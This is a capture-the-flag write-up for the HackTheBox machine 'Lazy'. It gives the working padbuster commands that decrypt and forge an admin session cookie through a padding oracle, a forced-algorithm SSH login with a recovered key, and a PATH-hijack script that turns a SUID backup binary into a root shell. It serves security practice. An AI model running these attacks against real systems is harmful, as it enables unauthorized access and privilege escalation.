---
title: 'HTB | Lazy'
published: 2025-07-02
draft: false
description: 'HTB Machine `Lazy` writeup.'
tags: ['HackTheBox', 'linux']
---

## Nmap Scanning

```shell
# Nmap 7.94SVN scan initiated Sat Jun  7 08:55:27 2025 as: nmap -sC -sV -p22,80 -Pn -n -vv -oN nmap/tcp_deep 10.10.10.18
Nmap scan report for 10.10.10.18
Host is up, received user-set (0.061s latency).
Scanned at 2025-06-07 08:55:27 IST for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPWgFMEZFoUTUVSoQqpR9/TWoUTUjhLp9VEwdA13KPUif01QrI3KjDijnW1Euf59459LdKn8OxgS9O2d3mt83LOSXqhZuRFPKYFMHiVL2W+LlgViuOpiCbwLevmYnFHqA1+bbEw7CMNlSOtzhwP1amy+S/6vR4pUfRlDRnFCjKxtAAAAFQC4GNDkk4V3P7Onw+K1+R0StfliZwAAAIBrJwlQlG01q0rr5EzCxwR/COtfRUmHjjjUS4znQlWGppGtHKDx/OLKoZYNQ5uW4p1SZEgI2/39UyKTrR5oVkc7SlT4wDDNfRV8xKTDukWWLwWYl9fU5GMJUxdaaq/RmRa7k36jxQ4HKi5E/UbyCX5cemUBsmuEm1gFTrVgTazHKQAAAIBn2bkGWEmxcEzYPiEDAZTlCStCQ0p9I919NzBuGxNl5pvdlEw2cs+L09gV1TdgMHxFF7hsCk8th0HxpzbIkRqDc2IUHaCszlXbmX6jy6/IVP1oSYGORwRT2G21Wfiv5IzTKfmoZByeECSmn3knFG67+NFhi0kA9wjFl70t2xe9DQ==
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqQ4CN1hc3z/EYWKu+JXV/bHFaOaS8JtDIsLQBaW05/Ug0C43nrTAhvlH2CKIrv0mobdXR1wzPfZNbMOXMAdg5l8qTWTZ2y8o9n9qdBQg5tGB+jY5tmLDkjxrUlFg2DE67HPjk015I4IRsUeSfH84vyocsTlyRK0DWIcgE2p0BFYE/7ob/aFljOFEXPw8xV4ikqUN3fEaap/jxr3zu0cabqBSouWIlrFUeNO6312jEQw1fOV+hvjGNUBy4b4AQyIvX/BrepjWByuhsc1Oeyv8c38v3eax7+L7MzmEC9yGlNPfYY0QMTlBxJiaUq4/l0XiS45nVQfTI2DQwUuCl48lV
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPmRSitDQZHOSWO9OKA3lbLBPDe7y1xFnpGPFn6bhMQlZZmN11BNq8MABy74Vvt7/gpfFpBHxYZNTR5GsjkeUM4=
|   256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGCgXZUrdvdL2ThoxG0fMTxdZ0puf7NuQJjRDtckrMlN
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 967B30E5E95445E29B882CC82774AC96
|_http-title: CompanyDev
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  7 08:55:36 2025 -- 1 IP address (1 host up) scanned in 9.11 seconds

```

- Nmap scanned two open ports : 22,80
- No vhost identified
- Apache 2.4.7 running a custom php application
- Register and Login pages set a cookie `auth=<cookie_value>`
  - A custom cookie, not provided by any framework

<hr>

## Directory Enumeration

- used wordlists `directory-list-2.3-small.txt` , `big.txt` , `raft-medium` , `common.txt` .
- Found nothing useful.

```shell
images
css
logout.php
login.php
register.php
classes
index.php
header.php
footer.php
server-status
```

- The `auth.php` page at `/classes/auth.php` redirects at `/admin/login.php` , which returns a `404` error.
- Tried to find any working page under `/admin/` directory using `GET` & `POST` , but found nothing.

<hr>

## Creating Admin cookie

- Using `Padbuster` , we conduct a [[Padding Oracle Attack]] , to `decrypt` our cookie value.

```shell
$ padbuster http://10.10.10.18/index.php ynO3yRb3nw%2B%2BBPYBBf%2B4UKi2Roc5hb%2Fr 8 -cookies auth=ynO3yRb3nw%2B%2BBPYBBf%2B4UKi2Roc5hb%2Fr -encoding 0

# cookie_value = 'user=conner'
```

- Then, with this same attack , we craft a cookie with value of `user=admin`.
- To find usernames of valid users, we can `bruteforce` login page with any password.

```bash
$ padbuster http://10.10.10.18/index.php ynO3yRb3nw%2B%2BBPYBBf%2B4UKi2Roc5hb%2Fr 8 -cookies auth=ynO3yRb3nw%2B%2BBPYBBf%2B4UKi2Roc5hb%2Fr -encoding 0 -plaintext user=admin
```

- With the admin cookie generated, we can log in as `Admin`.

<hr>

## `Mitsos` SSH Key

- After logging in as `Admin`, we find `mitsos` user's ssh key.
- But after trying to log in with ssh, we get an error.

```
sign_and_send_pubkey: no mutual signature supported
mitsos@10.10.10.18: Permission denied (publickey).
```

- This error occurred because **_there’s no mutual signature algorithm between the client and server for the key_**.
- To fix this, we can force ssh to use a specified algorithm in this way :

```bash
$ ssh -i mitsos.key -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostkeyAlgorithms=+ssh-rsa mitsos@10.10.10.18
```

<hr>

## Privilege Escalation

- At the home directory, we see a `backup` binary with `SUID` bit.
- Running the binary with [[ltrace]] help us to see that the binary is executing the following command using the `system()` function.

```
system(cat('/etc/shadow'))
```

- Here, the absolute path of the `cat` binary is not specified.
- Therefore, we can conduct a `Path Hijack` attack.

### Path Hijack

- We edit the system `PATH` variable to include `/tmp` directory at the start.

```shell
$ export PATH=/tmp:$PATH
```

- Then, we create a file called `cat` inside the `/tmp` directory with the following content :

```shell
#!/bin/sh
bash -p
```

- The shell should be `sh` , if using `bash` , we need to carry privileges using `-p` .
- We **set the execute permission** on this binary.
- Now, when running the `backup` bin again, we would be dropped in a root shell.

```shell
$ ./backup
# id
root
```

### Why `#!/bin/bash` does not work while `#!/bin/sh` does ?

It **depends on the interpreter and OS behavior**:

- On some systems, `/bin/sh` might **not be a shell script**, but a **binary** like `dash`, which **can be SUID-safe**.
- When your SUID binary explicitly **calls `sh` as a binary**, the SUID privilege may carry over.

Note : In this box, `/bin/sh` is indeed a binary `dash`.

- To carry privileges of `SUID` binary, we need to call `/bin/bash` with `-p` flag.
